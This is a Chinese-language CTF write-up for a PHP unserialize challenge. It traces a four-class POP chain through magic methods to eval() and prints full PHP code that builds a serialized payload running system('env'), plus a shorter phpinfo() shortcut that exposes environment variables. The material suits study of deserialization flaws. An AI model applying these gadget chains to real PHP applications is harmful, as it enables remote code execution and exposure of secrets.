# pop moe

## 题目简述

入口对 `data` 直接执行 PHP `unserialize()`。完整预期链跨越四个类，依次利用 `__destruct()`、`__invoke()`、`__set()`、动态方法调用和 `__toString()`，最终让 `class003::evvval()` 对可控字符串执行 `eval()`。原稿只给生成对象的 POC，并把触发机制留给外链；下面把整条链补全。

## 解题过程

目标类之间的调用关系可以压缩为：

```text
class000::__destruct()
  -> check(): $a = $this->what; $a()
class001::__invoke()
  -> $this->a->payload = $this->payl0ad
class002::__set($name, $method)
  -> $this->$method($this->sec)
class002::dangerous($obj)
  -> $obj->evvval($this->sec)
class003::evvval($str)
  -> eval($str)
class003::__toString()
  -> return $this->mystr
```

据此设置对象图：

- `class000::$payl0ad = 1`，绕过严格的零值检查；
- `class000::$what = class001`，析构时把对象当函数调用；
- `class001::$a = class002`，向不存在的 `payload` 写值以触发 `__set()`；
- `class001::$payl0ad = "dangerous"`，使 `__set()` 动态调用 `class002::dangerous()`；
- `class002::$sec = class003`；
- `class003::$mystr = "system('env');"`，对象传给 `eval()` 时由 `__toString()` 转成代码。

生成序列化串的代码如下：

```php
<?php
class class000 {
    private $payl0ad = 1;
    protected $what;
    public function __construct() { $this->what = new class001(); }
}

class class001 {
    public $payl0ad = "dangerous";
    public $a;
    public function __construct() { $this->a = new class002(); }
}

class class002 {
    private $sec;
    public function __construct() { $this->sec = new class003(); }
}

class class003 {
    public $mystr = "system('env');";
}

echo urlencode(serialize(new class000()));
```

提交后，环境变量中可见 flag。`urlencode()` 必不可少：`private` 属性序列化名含 `\0类名\0属性名`，`protected` 属性含 `\0*\0属性名`，NUL 字节必须编码为 `%00` 才能安全放进查询参数。

题目还存在更短的非预期链：只设置 `class000::$payl0ad = 1`、`class000::$what = "phpinfo"`，析构时会直接调用 `phpinfo()` 并从环境区读取 flag。它说明应先检查动态调用能否直接接收字符串 callable，再决定是否需要搭完整 POP 链。

## 方法总结

构造 POP 链时不要只列对象嵌套关系，要写清每次魔术方法的触发动作和参数如何流动。本题最容易漏掉的两个点是：给不存在的 `payload` 属性赋值才会触发 `class002::__set()`；传入 `eval()` 的是对象，必须由 `class003::__toString()` 变成代码字符串。与此同时，动态 callable 也可能产生比预期链更短的非预期解。
